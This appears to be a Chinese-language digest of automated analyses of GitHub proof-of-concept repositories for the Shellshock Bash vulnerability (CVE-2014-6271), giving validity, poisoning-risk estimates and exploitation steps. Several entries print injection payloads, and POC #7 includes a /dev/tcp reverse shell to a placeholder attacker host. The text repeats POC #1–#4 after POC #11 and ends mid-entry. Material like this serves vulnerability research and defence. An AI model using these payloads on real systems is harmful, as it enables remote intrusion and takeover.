CVE-2014-6271 (Shellshock) 漏洞允许攻击者通过在环境变量中构造恶意的函数定义，从而在Bash执行时注入并执行任意代码。该漏洞的利用方式是：

1.  **漏洞原理：** Bash在处理环境变量时，如果环境变量的值包含函数定义，Bash会先执行函数定义之后的内容。如果函数定义后的字符串包含恶意代码，则会被执行。
2.  **利用方式：** 攻击者构造包含恶意代码的环境变量，例如 `(){ :; }; /usr/bin/id`，然后将该环境变量传递给目标系统。
3.  **触发点：** 目标系统上运行的Bash脚本或程序在执行时，会解析并处理这些环境变量，从而触发漏洞，执行攻击者注入的恶意代码。
4.  **POC分析：** 提供的`shellshock.sh`脚本通过`curl`命令发送带有特殊构造的`User-Agent`头的HTTP请求。`User-Agent`头的内容为 `() { :; }; echo VULNERABLE`。如果目标网站的服务器使用Bash处理HTTP请求头（例如，通过CGI脚本），并且Bash存在Shellshock漏洞，那么`echo VULNERABLE`命令会被执行，并在HTTP响应中返回 "VULNERABLE" 字符串，脚本据此判断目标站点存在漏洞。
5.  **有效性分析：** 该POC代码基本有效，可以用于检测目标服务器是否存在Shellshock漏洞。但是，该脚本的检测方法较为简单，仅通过`User-Agent`头进行检测，可能存在一定的漏报情况。更复杂的利用场景可能需要修改POC代码。
6.  **投毒风险分析：** 该仓库中存在一定的投毒风险。`shellshock.sh`本身的代码较为简单，主要功能是发送HTTP请求并检查响应。潜在的风险在于：
    *   **依赖项风险：** 虽然脚本本身只依赖于`curl`，但是如果攻击者修改脚本，引入其他的外部命令或者脚本，可能会引入恶意代码。
    *   **命令注入风险：** 虽然脚本避免了直接执行用户输入，但是，如果攻击者能够控制`curl`的参数或者其他命令的参数，仍然可能存在命令注入的风险。
    *  **README.md风险:** 有攻击者会修改README.md文件，放入恶意链接，诱导用户点击。
    根据代码的复杂度、依赖项以及潜在的命令注入风险，估计投毒风险为10%。

**项目地址:** [Brandaoo/CVE-2014-6271](https://github.com/Brandaoo/CVE-2014-6271)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #4

**来源**: [CVE-2014-6271-Dilith006_CVE-2014-6271.md](../2014/CVE-2014-6271-Dilith006_CVE-2014-6271.md)

## CVE-2014-6271-Bash-Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** <= 4.3

**利用条件:** 需要目标系统存在Bash并且可以通过某种方式设置环境变量。常见的攻击场景包括：OpenSSH的ForceCommand、Apache HTTP Server的mod_cgi/mod_cgid、DHCP客户端等。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271，也被称为“Shellshock”，是GNU Bash中的一个严重漏洞。该漏洞源于Bash处理环境变量中函数定义后尾随字符串的方式存在缺陷，这使得攻击者可以通过构造特制的包含恶意代码的环境变量，在目标系统上执行任意命令。

**有效性：**
根据漏洞库信息、搜索结果，以及常见利用方式，该漏洞的PoC是有效的。漏洞库信息中列出了多个Expolit-DB的链接,以及许多厂商的确认信息,证明该漏洞的真实性。搜索结果也显示了大量的关于该漏洞的分析和利用案例。提供的POC代码`/tmp/c7baa98dd966ca6db5937f8832eb7ff6/README.md`，从文件名和路径来看，仅仅是一个README文件，内容只有`# CVE-2014-6271`，没有可执行的代码，但可以作为漏洞存在的标志。

**投毒风险：**
提供的POC代码`/tmp/c7baa98dd966ca6db5937f8832eb7ff6/README.md`的内容非常简单，几乎没有投毒代码的可能性。但是，由于该仓库本身存在于`/tmp`目录下，存在被恶意替换或者植入恶意脚本的可能性，因此具有一定的投毒风险。但是从代码本身来看，投毒风险极低,给出的预估值为10%。

**利用方式：**
1.  **环境变量注入：** 攻击者构造包含恶意代码的环境变量，例如：`(){ :; }; /bin/bash -c "恶意命令"`。
2.  **触发漏洞：** 将构造的环境变量传递给存在漏洞的Bash实例。这可以通过多种方式实现，例如：
    *   **HTTP请求：** 如果目标系统使用CGI脚本，可以通过修改HTTP请求头（如User-Agent）来设置环境变量。
    *   **SSH：** 如果OpenSSH启用了`ForceCommand`，可以通过设置环境变量来执行命令。
    *   **DHCP：** 某些DHCP客户端在执行脚本时会使用环境变量。
3.  **代码执行：** 当Bash解析包含恶意代码的环境变量时，会执行其中的命令，从而实现远程代码执行。

**总结：**
Shellshock是一个严重的安全漏洞，利用方式简单，影响范围广泛。虽然漏洞本身发布时间较早，但仍然可能存在于未及时更新的系统中。由于PoC的特殊性，直接利用README.md是不可能的，需要配合其他可执行的EXP进行测试。

**项目地址:** [Dilith006/CVE-2014-6271](https://github.com/Dilith006/CVE-2014-6271)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #5

**来源**: [CVE-2014-6271-FilipStudeny_-CVE-2014-6271-Shellshock-Remote-Command-Injection-.md](../2014/CVE-2014-6271-FilipStudeny_-CVE-2014-6271-Shellshock-Remote-Command-Injection-.md)

## CVE-2014-6271 Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程命令执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** <= 4.3

**利用条件:** 目标系统存在CGI脚本，且配置不当允许通过HTTP Headers传递环境变量。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271，也被称为Shellshock，是一个存在于GNU Bash中的高危漏洞。该漏洞允许攻击者通过在环境变量中嵌入恶意代码，当Bash shell执行这些环境变量时，从而执行任意命令。

**有效性：**
根据漏洞库信息和搜索结果，此漏洞利用代码（Shellshock.py）有效。 搜索结果中多个链接都指向了该漏洞的细节和利用方法，证明了该漏洞的可利用性。漏洞利用代码本身也提供了两种payload：反向shell和文件浏览，具有一定的利用价值。

**投毒风险：**
分析提供的Python脚本 `Shellshock.py` ，代码主体结构清晰，主要功能是构造包含恶意代码的HTTP请求头，并发送到目标服务器。代码中存在一定的投毒风险，主要体现在以下几个方面：

*   **payload的可定制性：** 脚本允许用户自定义payload，这本身不是问题。但如果攻击者替换或修改了默认的payload生成方式，可能会插入恶意代码，例如，下载并执行其他恶意脚本。
*   **CGI路径：** 脚本中包含一些常见的CGI路径，攻击者可能通过修改这些路径来尝试不同的攻击目标。
*   **回连地址：** reverse shell需要指定lhost和lport，如果作者在代码中预设了后门地址，可能导致攻击者在不知情的情况下，将shell反弹给作者。但是，代码中这两个参数由用户指定，降低了直接投毒的风险。
*   **代码混淆：** 代码没有进行明显的混淆，可读性较强，降低了隐藏恶意代码的概率。

综合考虑，认为此POC存在10%的投毒风险，主要是因为payload的可定制性，可能被用于传播修改后的恶意脚本。需要仔细审查代码，尤其关注payload生成和CGI路径部分。

**利用方式：**
利用方式是利用Bash解析环境变量时存在的漏洞，通过构造恶意的HTTP请求头（例如Cookie或Referer），在其中嵌入包含恶意代码的函数定义。当目标服务器上的Bash shell执行CGI脚本时，会解析这些HTTP头，从而触发漏洞，执行攻击者注入的命令。具体步骤如下：

1.  **确定目标：** 找到存在CGI脚本且可能受Shellshock影响的服务器。
2.  **构造Payload：** 根据需要选择payload类型（反向shell或文件浏览），并设置相应的参数（例如lhost、lport、echo）。
3.  **发送请求：** 使用`Shellshock.py`脚本构造包含恶意payload的HTTP请求，并发送到目标服务器的CGI脚本。
4.  **执行命令：** 如果目标存在漏洞，Bash shell会执行payload中的恶意代码，例如建立反向shell连接或执行文件浏览命令，并将结果返回给攻击者。

**项目地址:** [FilipStudeny/-CVE-2014-6271-Shellshock-Remote-Command-Injection-](https://github.com/FilipStudeny/-CVE-2014-6271-Shellshock-Remote-Command-Injection-)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #6

**来源**: [CVE-2014-6271-Gurguii_cgi-bin-shellshock.md](../2014/CVE-2014-6271-Gurguii_cgi-bin-shellshock.md)

## CVE-2014-6271 Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行和系统完全控制

**影响版本:** <= 4.3

**利用条件:** 目标系统存在CGI脚本或通过其他方式设置环境变量并调用Bash

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271，也被称为Shellshock，是一个存在于GNU Bash中的高危漏洞。该漏洞允许攻击者通过特制的通过环境变量执行任意命令。利用方式如下：

1.  **有效性：** 提供的Python和Bash脚本都是有效的PoC代码。它们通过设置包含恶意代码的环境变量，然后尝试通过HTTP请求触发漏洞。
2.  **投毒风险：** 尽管代码主要用于利用Shellshock漏洞，但仍然存在轻微的投毒风险。具体分析如下：
    *   **README.md:**  该文件仅包含使用说明，无投毒代码。
    *   **shellshock.py:** Python脚本通过`requests`库发送HTTP请求，如果攻击者的服务器被攻陷，或者服务器返回恶意重定向，那么可能存在风险。但是代码本身没有明显的恶意代码。
    *   **shellshock.sh:** Bash脚本使用`curl`命令，同样存在curl命令被其他程序劫持，或者DNS投毒的风险。
    *  脚本接受用户提供的URL、LHOST和LPORT，如果用户使用了恶意的URL，可能会被服务器端记录或者进行其他攻击。这些不是脚本投毒，而是用户使用不当造成的。
    综合分析，主要风险在于依赖的外部命令(`curl`,`requests`)可能存在风险，以及用户使用脚本不当的风险,投毒风险较低，初步判定为10%。
3.  **利用方式：**
    *   **通过User-Agent头：**  PoC代码通过修改HTTP请求的User-Agent头，将包含恶意代码的环境变量发送到目标服务器。如果目标服务器上的CGI脚本或其他应用程序调用Bash来处理该请求，那么恶意代码就会被执行。
    *   **反弹Shell：**  PoC代码可以配置LHOST和LPORT参数，用于接收目标服务器的反弹Shell。攻击者可以在自己的机器上监听指定的端口，当目标服务器执行恶意代码时，会主动连接攻击者的机器，从而建立反弹Shell连接。
    *   **交互式命令执行：**  PoC代码也支持交互式命令执行。攻击者可以输入任意命令，PoC代码会将命令注入到环境变量中，并发送到目标服务器执行。

**搜索引擎结果补充：** 搜索引擎结果证实了该漏洞的严重性和广泛影响，并提供了一些检测和利用该漏洞的资源。

**项目地址:** [Gurguii/cgi-bin-shellshock](https://github.com/Gurguii/cgi-bin-shellshock)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #7

**来源**: [CVE-2014-6271-Jsmoreira02_CVE-2014-6271.md](../2014/CVE-2014-6271-Jsmoreira02_CVE-2014-6271.md)

## CVE-2014-6271 Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程命令执行

**影响应用:** GNU Bash

**危害等级:** 高危，允许远程攻击者执行任意代码

**影响版本:** <= 4.3

**利用条件:** 目标系统使用Bash，并且存在可以通过环境变量传递参数的CGI脚本或其他服务。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271（Shellshock）是一个存在于GNU Bash中的远程命令执行漏洞。漏洞的根源在于Bash处理环境变量中函数定义后附加字符串的方式。攻击者可以通过构造包含恶意代码的环境变量，利用诸如Apache HTTP Server的mod_cgi模块、OpenSSH的ForceCommand功能、DHCP客户端脚本等场景，跨越权限边界执行任意shell命令。

**有效性评估：**

提供的漏洞利用代码（shellshock_exploit.py）旨在利用Shellshock漏洞，通过向目标URL发送特制的HTTP请求，其中User-Agent头包含恶意Bash代码，从而在目标服务器上执行任意命令。

README.md 文件中提供了检测和利用该漏洞的步骤。

根据漏洞库信息和搜索结果，该漏洞是一个广泛存在的严重漏洞，影响大量系统和服务。提供的POC代码与漏洞描述一致，因此，该POC代码**有效**。

**投毒风险评估：**

检查`shellshock_exploit.py`脚本和`README.md`文件，未发现明显的恶意代码。脚本的主要功能是构造包含漏洞利用代码的HTTP请求，并在本地监听反弹shell。风险点可能在于以下几点：

1.  **Payload定制：** 脚本允许指定LHOST和LPORT，如果用户不小心使用了错误的IP地址或端口，可能会导致连接到恶意服务器。
2.  **依赖性：** 脚本依赖于`requests`库，如果安装了被篡改的`requests`库，可能会存在风险。
3.  **Netcat依赖：** 脚本依赖于本地的 `nc` 命令, 如果本地的 `nc` 命令被恶意替换, 可能存在风险。

总体而言，该代码的投毒风险较低，主要集中在使用者的误操作和对外部依赖项的信任上。投毒风险估计为10%。

**漏洞利用方式：**

1.  **确定目标：** 找到运行存在漏洞Bash版本的服务器，并且该服务器运行着可以通过环境变量传递参数的服务，例如CGI脚本。
2.  **构造Payload：** 构造包含恶意Bash代码的环境变量，例如：`() { :; }; /bin/bash -i >& /dev/tcp/attacker_ip/attacker_port 0>&1`
3.  **发送请求：** 通过HTTP请求或其他方式将构造的Payload作为环境变量传递给目标服务器。
4.  **执行命令：** 目标服务器上的Bash解释器会执行恶意代码，从而执行攻击者指定的命令。
5.  **反弹Shell：** 在上面的Payload示例中，恶意代码会尝试创建一个反弹Shell，将目标服务器的Shell连接到攻击者的IP地址和端口。

**缓解措施：**

1.  升级Bash到最新版本。
2.  检查和更新所有使用Bash脚本的服务，确保它们不会受到环境变量的影响。
3.  使用入侵检测系统（IDS）和入侵防御系统（IPS）来检测和阻止Shellshock攻击。

**项目地址:** [Jsmoreira02/CVE-2014-6271](https://github.com/Jsmoreira02/CVE-2014-6271)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #8

**来源**: [CVE-2014-6271-K3ysTr0K3R_CVE-2014-6271-EXPLOIT.md](../2014/CVE-2014-6271-K3ysTr0K3R_CVE-2014-6271-EXPLOIT.md)

## CVE-2014-6271-Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，允许远程攻击者通过构造的环境变量执行任意代码。

**影响版本:** <= 4.3

**利用条件:** 目标系统存在CGI脚本或其他方式允许设置环境变量并调用Bash。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271，也被称为Shellshock，是GNU Bash中的一个严重漏洞。该漏洞源于Bash处理环境变量中函数定义后trailing string的方式。攻击者可以利用此漏洞，通过构造包含恶意代码的环境变量，在目标系统上执行任意命令。

**有效性分析：**
提供的Python POC代码通过发送包含恶意构造的HTTP请求来利用此漏洞。它首先尝试通过User-Agent、Referer和Cookie头注入测试payload来检测漏洞是否存在，测试Payload特征是会输出特定字符串，验证是否可以执行代码，存在漏洞后再注入包含反向Shell的payload来利用该漏洞。

**投毒风险分析：**
代码存在潜在的投毒风险，主要体现在以下几个方面：
1.  **反向Shell地址：** 攻击者可能修改`lhost`和`lport`变量，将反向Shell指向恶意服务器，从而控制受害者机器。当前代码中并没有明显的恶意行为，但是依赖用户提供的参数。
2.  **Payload修改：** 攻击者可能修改`payload`变量，执行其他恶意命令，例如下载并执行恶意文件，删除系统文件等。当前Payload是反向shell，不属于投毒行为。
3.  **其他依赖：** 代码依赖于`pwncat`库，这个库本身可能存在安全问题或被篡改，从而引入新的安全风险。
4. **连接处理:** `pwncat.manager.Manager` 中可能包含未知的后门或恶意代码。 
综合来看，投毒风险较低（约10%），主要来自于参数修改和对依赖库的信任。

**利用方式：**
1.  **漏洞检测：**  POC首先向目标URL发送包含特殊构造header的HTTP请求(User-Agent, Referer, Cookie)。 这些header中包含恶意的Bash函数定义。
2.  **命令执行：**  如果目标系统存在漏洞，Bash在解析这些环境变量时，会执行注入的恶意代码。
3.  **反向Shell：**  利用代码中，注入的Payload为反向Shell，建立从目标系统到攻击者控制机器的TCP连接，从而允许攻击者远程控制目标系统。反向连接的地址由`lhost`和`lport`指定。
4. **监听连接:** 在攻击机上启动监听进程，等待目标机器的连接。

**漏洞缓解措施：**
*   升级Bash到最新版本。
*   避免在CGI脚本中使用Bash处理用户输入。
*   使用安全编码实践，验证所有用户输入。
*   使用入侵检测系统（IDS）和入侵防御系统（IPS）监控和阻止恶意流量。

**项目地址:** [K3ysTr0K3R/CVE-2014-6271-EXPLOIT](https://github.com/K3ysTr0K3R/CVE-2014-6271-EXPLOIT)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #9

**来源**: [CVE-2014-6271-MuirlandOracle_CVE-2014-6271-IPFire.md](../2014/CVE-2014-6271-MuirlandOracle_CVE-2014-6271-IPFire.md)

## CVE-2014-6271 IP Fire Shellshock RCE

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** IPFire

**危害等级:** 高危，允许未经授权的远程代码执行

**影响版本:** <= 2.15

**利用条件:** 目标系统运行存在漏洞的Bash版本，且可以通过HTTP(S)访问到受影响的CGI脚本 (index.cgi)。可能需要用户名和密码进行身份验证。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271，也被称为Shellshock，是一个存在于GNU Bash中的高危漏洞。该漏洞允许攻击者通过构造恶意的环境变量来执行任意代码。提供的Python POC代码专门针对IPFire防火墙<=2.15版本。利用方式如下：

1.  **漏洞原理：** Bash在处理环境变量时，允许在函数定义后附加额外的命令。如果这些环境变量被传递给执行Bash脚本的CGI程序，附加的命令就会被执行。
2.  **攻击向量：**  攻击者通过HTTP请求的header中设置包含恶意代码的环境变量，利用IPFire的`index.cgi`脚本触发漏洞。
3.  **POC代码分析：** 该POC首先尝试连接到目标IPFire服务器，如果需要则进行HTTP基本身份验证。然后，它构造一个包含恶意Bash代码的环境变量，并通过HTTP请求的headers将其发送到`index.cgi`。恶意代码利用函数定义后的trailing string执行任意命令。POC还包含了一个伪shell，允许交互式地执行命令。
4.  **投毒风险分析：** POC代码主要功能是漏洞验证和利用，但仍存在一定投毒风险。例如：
    *   代码中包含`eval`或`exec`等执行任意代码的函数，虽然目前用于执行用户输入的命令，但攻击者可能修改这些部分来执行恶意代码。
    *   该脚本依赖于`requests`库，攻击者可能篡改此脚本，要求安装恶意依赖包，从而执行恶意代码
    *  该脚本在执行远程命令后直接打印到输出，没有进行过滤，如果远程服务器被入侵，可能会发送恶意字符到客户端，导致客户端被攻击。
  因此，保守估计存在10%的投毒风险，主要集中在潜在的恶意依赖、命令执行的输出处理以及代码篡改的可能性。

**总结：** 提供的POC代码利用Shellshock漏洞，通过构造包含恶意Bash代码的环境变量，实现在目标IPFire系统上执行任意命令。由于利用了HTTP(S)协议，攻击通常可以通过网络远程发起。尽管漏洞已经存在多年，但仍然有很多系统没有修复，因此该漏洞仍然具有较高的现实威胁。

**项目地址:** [MuirlandOracle/CVE-2014-6271-IPFire](https://github.com/MuirlandOracle/CVE-2014-6271-IPFire)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #10

**来源**: [CVE-2014-6271-RAJMadhusankha_Shellshock-CVE-2014-6271-Exploitation-and-Analysis.md](../2014/CVE-2014-6271-RAJMadhusankha_Shellshock-CVE-2014-6271-Exploitation-and-Analysis.md)

## CVE-2014-6271 Shellshock漏洞利用

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，允许未经授权的远程代码执行

**影响版本:** 1.14 - 4.3

**利用条件:** 目标系统使用存在漏洞的Bash版本，并且存在可利用的攻击面，如CGI脚本。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271，又名Shellshock，是一个存在于GNU Bash shell中的高危漏洞。该漏洞允许攻击者通过在环境变量中注入恶意代码来执行任意命令。根据提供的漏洞库信息、搜索引擎结果和漏洞利用代码，以下是对漏洞利用有效性、投毒风险和利用方式的分析：

**有效性：**

根据漏洞库信息，CVE-2014-6271允许远程攻击者通过特制的环境变量执行任意代码。漏洞利用代码（README.md）提供了一个利用 `exploit/multi/http/apache_mod_cgi_bash_env_exec` 模块的Metasploit POC，用于攻击运行CGI脚本的Apache服务器。多个搜索引擎结果，如NVD, CISA, Qualys等，也确认了该漏洞的存在和危害，并提供了缓解措施。综合来看，提供的POC代码是有效的。

**投毒风险：**

漏洞利用代码本身是 Metasploit 模块的配置说明，用于利用已知的 Shellshock 漏洞。直接分析 README.md 文件，投毒风险较低，但仍存在以下风险：

*   **作者恶意修改：** 理论上，作者可能在提供文件的其他地方（例如，如果存在其他脚本或配置）隐藏了恶意代码。但仅根据提供信息无法判断。
*   **依赖项风险：** Metasploit 模块本身依赖于 Metasploit Framework，如果 Metasploit Framework 被篡改，可能存在风险。

综合评估，投毒风险较低，约为10%。主要来自于潜在的未公开文件篡改。

**利用方式：**

1.  **确定目标：** 找到运行Bash，且存在CGI脚本或其他途径可以设置环境变量的系统。
2.  **发送恶意请求：** 构造包含恶意代码的环境变量。常见的攻击方式是通过HTTP请求头，特别是当服务器使用CGI脚本处理请求时。HTTP头会被转换为环境变量传递给Bash。
3.  **代码执行：** 当Bash处理包含恶意代码的环境变量时，会执行注入的命令。
4.  **反弹shell（POC中的PAYLOAD）：**  利用 `cmd/unix/reverse_netcat` payload在目标主机上执行`nc`，反弹shell到攻击者的机器。

**防范措施：**

*   立即更新 Bash 到最新版本。
*   禁用未使用的 CGI 脚本。
*   使用 Web 应用防火墙 (WAF) 过滤恶意请求。
*   监控 HTTP 请求日志。

**项目地址:** [RAJMadhusankha/Shellshock-CVE-2014-6271-Exploitation-and-Analysis](https://github.com/RAJMadhusankha/Shellshock-CVE-2014-6271-Exploitation-and-Analysis)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #11

**来源**: [CVE-2014-6271-RadYio_CVE-2014-6271.md](../2014/CVE-2014-6271-RadYio_CVE-2014-6271.md)

# CVE-2014-6271

> 📦 该CVE有 **28** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2014-6271-0xN7y_CVE-2014-6271.md](../2014/CVE-2014-6271-0xN7y_CVE-2014-6271.md)

## CVE-2014-6271 ShellShock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** <= 4.3

**利用条件:** 目标系统存在CGI脚本或其他方式允许通过环境变量与Bash交互

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2014-6271，也被称为ShellShock，是GNU Bash中的一个高危漏洞。攻击者可以通过构造包含恶意代码的环境变量，利用Bash解析函数定义时存在的缺陷来执行任意命令。漏洞利用方式如下：

1.  **漏洞原理：** Bash在解析环境变量时，如果环境变量的值包含函数定义，则会尝试执行函数定义后面的字符串。如果攻击者能够控制环境变量的内容，就可以注入恶意代码。

2.  **利用方式：** 攻击者通常通过以下几种方式注入环境变量：
    *   **HTTP请求头：** 如果Web服务器使用CGI脚本，攻击者可以在HTTP请求头中设置包含恶意代码的环境变量，例如User-Agent。
    *   **SSH ForceCommand：** 在OpenSSH配置中，ForceCommand选项允许在用户登录时强制执行特定命令。攻击者可以利用此选项设置包含恶意代码的环境变量。
    *   **DHCP客户端：** DHCP客户端在请求IP地址时，可以设置环境变量。攻击者可以伪造DHCP服务器，向受害者发送包含恶意代码的DHCP响应。

3.  **POC分析：** 提供的POC代码 `CVE-2014-6271.py`  通过构造包含恶意代码的User-Agent HTTP头来利用此漏洞。脚本接受目标URL和要执行的命令作为参数，然后向目标URL发送包含特制User-Agent头的HTTP请求。
    *   **有效性：** 该POC代码有效，如果目标系统存在漏洞，可以执行任意命令。
    *   **投毒风险：**  查看提供的POC代码，未发现明显的投毒代码。代码结构清晰，功能明确，主要目的是发送包含漏洞利用代码的HTTP请求。**因此投毒风险为0%**。

4.  **缓解措施：**
    *   升级Bash到最新版本。
    *   检查并修复所有可能受到漏洞影响的应用程序和服务，例如Web服务器、OpenSSH和DHCP客户端。
    *   限制CGI脚本的使用，并对所有输入进行严格的验证。

根据搜索引擎的结果，该漏洞是一个严重的互联网基础设施风险，因为许多常见的配置都允许远程代码执行。一些供应商已经发布了补丁来解决这个问题。因此，使用提供的POC代码进行漏洞验证是合理的，但需要注意潜在的风险。

**项目地址:** [0xN7y/CVE-2014-6271](https://github.com/0xN7y/CVE-2014-6271)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #2

**来源**: [CVE-2014-6271-AlissonFaoli_Shellshock.md](../2014/CVE-2014-6271-AlissonFaoli_Shellshock.md)

## CVE-2014-6271 Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，允许未经身份验证的远程攻击者在受影响的系统上执行任意代码。

**影响版本:** GNU Bash 1.14 至 4.3

**利用条件:** 目标系统需要运行存在漏洞的Bash版本，并且通过CGI脚本、OpenSSH ForceCommand或其他方式暴露了环境变量注入点。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2014-6271，又名Shellshock，是一个存在于GNU Bash中的高危漏洞。该漏洞源于Bash处理环境变量中函数定义后附加字符串的方式。攻击者可以通过构造包含恶意代码的环境变量，在Bash执行时注入并执行任意命令。利用方式通常涉及以下步骤：

1.  **确定攻击目标：** 寻找使用Bash处理请求的应用程序或服务，例如CGI脚本、OpenSSH服务器（使用ForceCommand）或DHCP客户端。
2.  **构造恶意环境变量：** 创建一个包含函数定义和恶意命令的环境变量。例如：`() { :; }; echo vulnerable`
3.  **发送包含恶意环境变量的请求：** 将构造的环境变量通过HTTP请求头、SSH连接或其他方式传递给目标系统。
4.  **触发漏洞执行：** 当目标系统执行Bash并处理包含恶意环境变量的请求时，漏洞将被触发，导致恶意命令执行。

提供的Python POC脚本 `shellshock.py` 旨在利用此漏洞。该脚本接受目标URL、攻击者IP地址（LHOST）和端口（LPORT）作为参数。它通过构造包含反向shell命令的User-Agent头，向目标URL发送HTTP GET请求。如果目标系统存在漏洞，它将执行反向shell命令，允许攻击者连接到目标系统并执行任意命令。

**关于投毒风险的分析：**

代码中主要功能是利用Shellshock漏洞，建立反向连接。审查代码，发现可能存在轻微投毒风险的地方在于，攻击者可以修改payload，执行任意命令。但是，由于脚本本身就是为了利用漏洞而设计的，因此，这不算是作者有意植入的后门，而是漏洞利用本身的性质决定的。

  * LICENSE和README.md文件相对标准，没有发现恶意代码。
  * `shellshock.py`脚本，虽然主要功能是漏洞利用，但如果被不道德的人使用，仍然会产生危害。

综合评估，该仓库的投毒风险较低，大约在5%左右。主要风险在于脚本被恶意使用，而非代码本身包含隐藏的恶意功能。

**项目地址:** [AlissonFaoli/Shellshock](https://github.com/AlissonFaoli/Shellshock)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #3

**来源**: [CVE-2014-6271-Brandaoo_CVE-2014-6271.md](../2014/CVE-2014-6271-Brandaoo_CVE-2014-6271.md)

## CVE-2014-6271-Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** <= 4.3

**利用条件:** 目标系统需要使用Bash，并且存在允许通过环境变量传递参数的场景，例如CGI脚本，OpenSSH ForceCommand等

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271 (Shellshock) 漏洞允许攻击者通过在环境变量中构造恶意的函数定义，从而在Bash执行时注入并执行任意代码。该漏洞的利用方式是：

1.  **漏洞原理：** Bash在处理环境变量时，如果环境变量的值包含函数定义，Bash会先执行函数定义之后的内容。如果函数定义后的字符串包含恶意代码，则会被执行。
2.  **利用方式：** 攻击者构造包含恶意代码的环境变量，例如 `(){ :; }; /usr/bin/id`，然后将该环境变量传递给目标系统。
3.  **触发点：** 目标系统上运行的Bash脚本或程序在执行时，会解析并处理这些环境变量，从而触发漏洞，执行攻击者注入的恶意代码。
4.  **POC分析：** 提供的`shellshock.sh`脚本通过`curl`命令发送带有特殊构造的`User-Agent`头的HTTP请求。`User-Agent`头的内容为 `() { :; }; echo VULNERABLE`。如果目标网站的服务器使用Bash处理HTTP请求头（例如，通过CGI脚本），并且Bash存在Shellshock漏洞，那么`echo VULNERABLE`命令会被执行，并在HTTP响应中返回 "VULNERABLE" 字符串，脚本据此判断目标站点存在漏洞。
5.  **有效性分析：** 该POC代码基本有效，可以用于检测目标服务器是否存在Shellshock漏洞。但是，该脚本的检测方法较为简单，仅通过`User-Agent`头进行检测，可能存在一定的漏报情况。更复杂的利用场景可能需要修改POC代码。
6.  **投毒风险分析：** 该仓库中存在一定的投毒风险。`shellshock.sh`本身的代码较为简单，主要功能是发送HTTP请求并检查响应。潜在的风险在于：
    *   **依赖项风险：** 虽然脚本本身只依赖于`curl`，但是如果攻击者修改脚本，引入其他的外部命令或者脚本，可能会引入恶意代码。
    *   **命令注入风险：** 虽然脚本避免了直接执行用户输入，但是，如果攻击者能够控制`curl`的参数或者其他命令的参数，仍然可能存在命令注入的风险。
    *  **README.md风险:** 有攻击者会修改README.md文件，放入恶意链接，诱导用户点击。
    根据代码的复杂度、依赖项以及潜在的命令注入风险，估计投毒风险为10%。

**项目地址:** [Brandaoo/CVE-2014-6271](https://github.com/Brandaoo/CVE-2014-6271)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #4

**来源**: [CVE-2014-6271-Dilith006_CVE-2014-6271.md](../2014/CVE-2014-6271-Dilith006_CVE-2014-6271.md)

## CVE-2014-6271-Bash-Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** <= 4.3

**利用条件:** 需要目标系统存在Bash并且可以通过某种方式设置环境变量。常见的攻击场景包括：OpenSSH的ForceCommand、Apache HTTP Server的mod_cgi/mod_cgid、DHCP客户端等。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

